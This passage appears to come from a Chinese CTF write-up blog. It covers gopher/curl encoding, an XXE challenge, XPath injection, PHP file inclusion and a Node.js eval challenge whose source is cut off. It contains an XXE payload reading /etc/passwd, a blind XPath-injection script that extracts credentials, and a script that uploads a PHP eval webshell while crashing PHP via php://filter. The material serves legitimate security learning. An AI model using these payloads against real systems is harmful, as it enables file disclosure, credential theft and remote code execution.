<h2 id="curl与二次编码"><a href="#curl与二次编码" class="headerlink" title="curl与二次编码"></a>curl与二次编码</h2><p>这里有一个比较奇怪的思考部分。往常用gopher打内网的时候，提交的参数一般是GET或者POST，所以通常我们要二次编码，使得数据在被服务端接收到解码一次之后还是被编码的数据。然而这里因为payload是随文件上传到远端的，所以只需要进行一次编码，也很合理。但是出现了一点小小的意外。PHP的urlencode函数会将空格编码为<code>+</code>而不是<code>%20</code>，这并没有问题，因为正常的服务端会把<code>+</code>解析回空格。而这次进行攻击时，我发现FPM收到的内容仍然是加号，而剩下的URL编码却正确的解码了。似乎，解码的情况有些不对？是FPM对收到的内容解码但不能正确解码加号？然后我直接nc一个端口，让curl给我发送一段一次编码过的gopher请求，收到的结果确是已经解码的？<br>我之前一直认为二次编码的意义在于服务端收到时解一次码，服务端ssrf请求发出去之后，被攻击的服务端收到再解一次码，这样子进行二次的编码。但似乎这里情况有些不一样，这个请求在发送出来之前就已经被解码了一次，且解码的时候只能正确的识别<code>%xx</code>的形式，不能识别加号</p>
<p>经过反复的实验，我发现似乎问题出在协议上，curl在发送http协议时，不会对url进行解码，而是等待接收消息的服务端自行解码，而发送gopher协议时，会在发送时就对url进行解码，以防接收端不会进行解码（编码是必须的，因为curl如果收到了回车之类的特殊字符是没法正常跑起来的）。这样一来，无论是怎么样，ssrf都要进行二次编码的操作应该是正确的，但换一步想，如果要用gopher打内网http POST的话，是不是得三重编码？</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>phar</tag>
        <tag>gopher</tag>
      </tags>
  </entry>
  <entry>
    <title>[NCTF2019]True XML cookbook</title>
    <url>/%5BNCTF2019%5DTrue%20XML%20cookbook.html</url>
    <content><![CDATA[<h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>xxe题目，不常见，感觉好像遇到这种题目都是搜一个payload直接打，不过今天看到一个好文章，可以稍微系统的学习一下，起码理解一下之前打XXE的时候遇到的问题是怎么回事</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>查看源码可以看到一个js函数</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">doLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> username <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> password <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> password <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Please enter the username and password!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token string">"&lt;user>&lt;username>"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"&lt;/username>&lt;password>"</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"&lt;/password>&lt;/user>"</span><span class="token punctuation">;</span> 
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        type<span class="token punctuation">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
        url<span class="token punctuation">:</span> <span class="token string">"doLogin.php"</span><span class="token punctuation">,</span>
        contentType<span class="token punctuation">:</span> <span class="token string">"application/xml;charset=utf-8"</span><span class="token punctuation">,</span>
        data<span class="token punctuation">:</span> data<span class="token punctuation">,</span>
        dataType<span class="token punctuation">:</span> <span class="token string">"xml"</span><span class="token punctuation">,</span>
        anysc<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        success<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">var</span> code <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">;</span>
            <span class="token keyword">var</span> msg <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>code <span class="token operator">==</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> <span class="token string">" login fail!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>code <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> <span class="token string">" login success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"error:"</span> <span class="token operator">+</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        error<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>XMLHttpRequest<span class="token punctuation">,</span>textStatus<span class="token punctuation">,</span>errorThrown<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>errorThrown <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> textStatus<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
</code></pre>
<p>直接抓包也可以看到内容是以XML格式提交的，那么抄一个payload打一下试试</p>
<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
<span class="token doctype">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" ></span>]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>
</code></pre>
<p>成功读到文件，证明可以打，这里注意一个点，就是当xxe读取文件的时候，读取的文件不允许有&lt;&gt;之类的标记，会导致实体替换之后影响xml文档解析，而在不同的平台上还可以支持不同的协议，这里是在PHP上运行的，所以能够用PHP支持的协议入php:&#x2F;&#x2F;filter之类的进行编码读取内容，读了一下doLogin.php没什么东西<br>XXE能够实现的攻击一般来说是文件读取，也可以发起内网扫描，读一下&#x2F;etc&#x2F;hosts，发现还真的有内网主机173.203.47.9，用http协议访问，但是没有结果。。。。搜了一下wp，结果是内网扫描，其实只要往后访问一位173.203.47.10就直接获得flag了</p>
<h2 id="超级详细XXE讲解文章"><a href="#超级详细XXE讲解文章" class="headerlink" title="超级详细XXE讲解文章"></a>超级详细XXE讲解文章</h2><p><a href="https://xz.aliyun.com/t/3357#toc-23">https://xz.aliyun.com/t/3357#toc-23</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>[NPUCTF2020]ezlogin</title>
    <url>/%5BNPUCTF2020%5Dezlogin.html</url>
    <content><![CDATA[<h1 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h1><p>xml注入，全新知识点</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>打开题目可以发现username和password是以xml格式提交的，第一反应就是xxe。<br>xxe不会，随便搜了几个payload来打，回显格式不对，估计是没机会了，直接搜wp进行学习</p>
<p>找到一个xpath注入的文章<a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</a><br>注入整体思路和SQL注入类似，不过这里没什么过滤，这个注入也没注释符，手动闭合一下引号<br>再贴一个抄来的脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
url <span class="token operator">=</span> <span class="token string">'http://954ee49d-e7ac-4919-9dc7-91e617267870.node3.buuoj.cn/login.php'</span>

head <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"</span><span class="token punctuation">,</span>
    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/xml"</span>
<span class="token punctuation">}</span>
find <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span><span class="token string">'&lt;input type="hidden" id="token" value="(.*?)" />'</span><span class="token punctuation">)</span>

strs <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>

flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
        r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>
        token <span class="token operator">=</span> find<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># 方括号内数为第几个节点</span>
        <span class="token comment" spellcheck="true"># 猜测根节点名称</span>
        payload_1 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/*[1]), {}, 1)='{}'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>{}&lt;/token>"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>
            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># 猜测子节点名称</span>
        payload_2 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/root/*[1]), {}, 1)='{}'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>{}&lt;/token>"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>
            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true"># 猜测accounts的节点</span>
        payload_3 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/root/accounts/*[2]), {}, 1)='{}'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>{}&lt;/token>"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>
            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true"># 猜测user节点</span>
        payload_4 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/root/accounts/user/*[2]), {}, 1)='{}'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>{}&lt;/token>"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>
            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true"># 跑用户名和密码</span>
        payload_username <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(/root/accounts/user[1]/username/text(), {}, 1)='{}'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>{}&lt;/token>"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>
            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        payload_password <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(/root/accounts/user[2]/password/text(), {}, 1)='{}'  or ''='&lt;/username>&lt;password>3123&lt;/password>&lt;token>{}&lt;/token>"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>
            i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true"># print(payload_username)</span>
        r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">,</span> data<span class="token operator">=</span>payload_password<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(r.text)</span>

        <span class="token keyword">if</span> <span class="token string">"非法操作"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>

    <span class="token keyword">if</span> <span class="token string">"用户名或密码错误!"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre>
<p>这里还有一个token，每隔一段时间会变化，所以脚本里面还用正则匹配了一下token提交<br>链接中文章还对获取节点下子节点个数和节点长度进行了介绍，但是实际上注入的时候直接爆字段就可以了，如果长度超了或者项不存在就直接查不出来，也不费什么事<br>最后查出来两个用户，一个guest密码123456，一个adm1n密码gtfly123，密码都是md5，123456查一下就能查出来，gtfly123在chamd5上收费，我一时间强烈怀疑出题人什么心态。。。最后找了个wp找到密码登录进去<br>guest登录进去一无所有，还没有登出功能，手动清cookie。。。adm1n登进去之后文件包含，过滤的所有字符可以大写绕过，php:&#x2F;&#x2F;filter读flag<br>php:&#x2F;&#x2F;filter这种东西大写部分字母还能用别说还挺神奇的</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>xml注入</tag>
      </tags>
  </entry>
  <entry>
    <title>[NPUCTF2020]ezinclude</title>
    <url>/%5BNPUCTF2020%5Dezinclude.html</url>
    <content><![CDATA[<h1 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h1><p>文件包含新知识，题目第一个点看的我莫名其妙的</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>进来就是一句username&#x2F;password error，源码里有一句注释&lt;!–md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass –&gt;也是看得人不明所以，也没说是post还是get传参，本来感觉应该是一个哈希扩展攻击，但是secret的长度未知，好像也没法进行。随便输了点东西之后给了我一个名字叫Hash的cookie，就直接把md5($secret.$name)给我了？？？把密码换成cookie值就可以了</p>
<p>然后会给一个flflflflag.php，但是打开就重定向到404，所以还是用burp抓包<br>给了一个include $_GET[‘file’];简单测试之后，input，data等字段都给过滤了，还是没有想象中那么简单</p>
<p>那么现在的想法就是去包含上传文件，有两种情况，在可以访问phpinfo的情况下，疯狂上传大文件，同时在phpinfo中可以看到上传的文件在tmp目录下的文件名，条件竞争，在文件被删除之前包含进来getshell；第二种就是今天的新知识点，通过include导致PHP崩溃，上传文件不被移除，遗留在tmp目录下，这种方法的问题在于不需要条件竞争，但是文件名为PHPxxxxxx，需要爆破文件名，后来看wp知道还有一个dir.php，作用就是var_dump(scandir(&#x2F;tmp));</p>
<p>到这里思路就很简单了，手搓一个文件上传，想办法引发PHP崩溃，去dir.php里面看上传的文件名，包含getshell</p>
<p>php&lt;7.2时，include语句为php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd时可以引发PHP崩溃</p>
<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>文件上传不晓得咋整的，这次上传文件就着原来的脚本不能用了，报错<br>然后抄了一个脚本，如下形式上传文件</p>
<pre class=" language-python"><code class="language-python">shell <span class="token operator">=</span> <span class="token string">"&lt;?php eval($_REQUEST['a']); ?>"</span>
url <span class="token operator">=</span> <span class="token string">"http://983c44af-1a5b-48e8-bf90-a3d29458e7c4.node3.buuoj.cn/flflflflag.php"</span>
files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span>shell<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
payload <span class="token operator">=</span> <span class="token string">"?file=php://filter/string.strip_tags/resource=/etc/passwd"</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
</code></pre>
<p>原来的形式是files是一个列表，第一项是$_FILE这个全局数组的键名，第二项一个元组，内容是文件名和文件内容</p>
<p>又flag在phpinfo中，一开始用了一下system发现没成，查了一下disable_function发现禁用了一堆，还以为又要bypass_disable_function</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>看到一个文件包含利用大全的总结，很强<br><a href="https://bbs.zkaq.cn/t/3639.html">https://bbs.zkaq.cn/t/3639.html</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>[NPUCTF2020]验证🐎</title>
    <url>/%5BNPUCTF2020%5D%E9%AA%8C%E8%AF%81%F0%9F%90%8E.html</url>
    <content><![CDATA[<h1 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h1><p>js题，很有意思，学习了</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> cookieSession <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> keys <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./key.js'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>keys<span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">saferEval</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token function">eval</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span>

<span class="token keyword">const</span> template <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./index.html'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> template<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'{{results}}'</span><span class="token punctuation">,</span> results<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'&lt;br/>'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieSession</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    name<span class="token punctuation">:</span> <span class="token string">'PHPSESSION'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span>
    keys
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>Object<span class="token punctuation">)</span><span class="token punctuation">;</span>
Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> results <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>results <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> e<span class="token punctuation">,</span> first<span class="token punctuation">,</span> second <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>first <span class="token operator">&amp;&amp;</span> second <span class="token operator">&amp;&amp;</span> first<span class="token punctuation">.</span>length <span class="token operator">===</span> second<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> first<span class="token operator">!==</span>second <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>first<span class="token operator">+</span>keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span>second<span class="token operator">+</span>keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                result <span class="token operator">=</span> <span class="token function">saferEval</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'Wrong Wrong Wrong!!!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
                result <span class="token operator">=</span> <span class="token string">'Wrong Wrong Wrong!!!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            results<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>result<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        results<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span><span class="token string">'Not verified!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>results<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        results<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>results <span class="token operator">=</span> results<span class="token punctuation">;</span>
